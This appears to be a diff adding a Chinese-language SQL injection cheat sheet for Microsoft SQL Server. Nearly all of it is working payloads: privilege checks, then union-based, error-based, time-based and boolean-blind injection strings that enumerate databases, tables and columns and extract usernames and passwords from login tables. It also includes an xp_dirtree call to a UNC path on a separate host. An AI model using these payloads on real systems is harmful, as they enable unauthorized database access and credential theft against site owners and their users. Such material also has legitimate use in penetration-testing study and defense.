@@ -1,0 +1,130 @@
+SQLServer有三个权限级别：
+
+sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限
+
+db权限：文件管理，数据库操作等权限 users-administrators
+
+public权限：数据库操作 guest-users
+
+SQLServer数据库有6个默认的库，分别是4个系统数据库：master 、model 、msdb 、tempdb，
+和2个实例数据库：ReportServer、ReportServerTempDB。其中，系统数据库 model 和 tempdb 默认是没有数据表的。
+
+payload:
+select @@version; #查询数据库的版本
+
+select @@servername; #查询服务名
+
+select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字
+
+select db_name(); #查询当前数据库名
+
+select db_name(1); #查询第一个数据库名
+
+select db_name(2); #查询第二个数据库名
+
+select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner
+
+use tempdb #切换到tempdb表
+
+top n #查询前n条记录
+
+limit 2,3 #查询第2条开始的3条数据，也就是2,3,4
+
+select substring('string',2,1) #截取给定字符串的索引为2的1个字符
+
+select ascii('a') #查询给定字符串的ascii值
+
+select len('string') #查询给定字符串的长度
+
+EXEC sp_spaceused @updateusage = N'TRUE'; #查询当前数据库的大小
+
+sp_spaceused '表名' #查询指定表名的大小
+
+EXEC master.sys.xp_dirtree '\192.168.106.5\xx.txt',0,1;
+
+判断是否是SA权限
+
+select is_srvrolemember('sysadmin')
+
+判断是否是db_owner权限
+
+select is_member('db_owner')
+
+判断是否是public权限
+
+select is_srvrolemember('public')
+
+普通注入
+order by 2 成功；order by 3 失败； order by 4 成功；order by 5 失败 说明列数位于 3-4之间。查找回显点
+
+id=2 and 1=2 union all select null,null,null,null；挨个替换null 发现 select null,2,null,null 页面出现回显。
+
+查找所在库名称添加： ?id=2 and 1=2 union all select 1,(select db_name()), '3', 4
+
+找到数据库名称。 提示：这里也可以使用db_name(1)、db_name(2)等查询其他数据
+
+查找数据库表名称：?id=2 and 1=2 union all select 1,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype = 'U'),'3',4提示: xtype='U' 为 用户表
+
+?id=2 and 1=2 union all select 1,(select top 1 col_name(object_id('manage'),1) from sysobjects),'3',4替换 col_name(object_id('manage'),1) 中的1 依次为 2，3，4查出所有列名。
+
+查取数据: ?id=2 and 1=2 union all select 1,(select top 1 username from manage),'3',4 获取用户名；
+
+?id=2 and 1=2 union all select 1,(select top 1 password from manage),'3',4 获取密码
+
+获取当前数据库中的表（有2个语句可供选择使用）【下列语句可一次爆数据库所有表（只限于mssql2005及以上版本）】
+
+?id=1 and 1=2 union all select 1,(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--
+
+(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--
+
+一次爆指定表的所有列（只限于mssql2005及以上版本）：
+
+?id=1 and 1=2 union all select 1,(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--
+
+(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))—
+
+
+报错注入
+and 1=(select @@VERSION) //MSSQL版本
+
+And 1=(select db_name()) //当前数据库名
+
+and 1=(select @@servername) //本地服务名
+
+and 1=(select IS_SRVROLEMEMBER('sysadmin')) //判断是否是系统管理员sa
+
+常用权限：sysadmin、serveradmin、setupadmin、securityadmin、diskadmin、bulkadmin
+
+and 1=(Select IS_MEMBER('db_owner')) //判断是否是库权限dbo
+
+and 1= (Select HAS_DBACCESS('master')) //判断是否有库读取权限
+
+单个爆破：
+and 1=convert(int,(select top 1 table_name from information_schema.tables ))—获取第一个表名
+
+and 1=convert(int,(select top 1 table_name from information_schema.tables where table_name not in('photoGalary') )) 获取第二个表名
+
+and 1=convert(int,(select top 1 column_name from information_schema.columns where table_name='login' ))— 获取第一个列名
+
+and 1=convert(int,(select top 1 username from login ))
+
+and 1=convert(int,(select top 1 password from login ))
+
+全爆语句
+爆表，要求sqlserver版本2005以上
+
+and 1=(select quotename(name) from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--
+and 1=(select '|'%2bname%2b'|' from 数据库名..sysobjects where xtype='U' FOR XML PATH(''))--
+
+爆列
+
+and 1=(select quotename(name) from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))--
+and 1=(select '|'%2bname%2b'|' from 数据库名..syscolumns where id =(select id from 数据库名..sysobjects where name='指定表名') FOR XML PATH(''))—
+
+时间注入
+aspx?id=1;if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5' –
+
+如果是sa权限，就延时。
+
+布尔盲注
+1.aspx?id=1 and ascii(substring((select top 1 name from master.dbo.sysdatabases),1,1)) >= 109
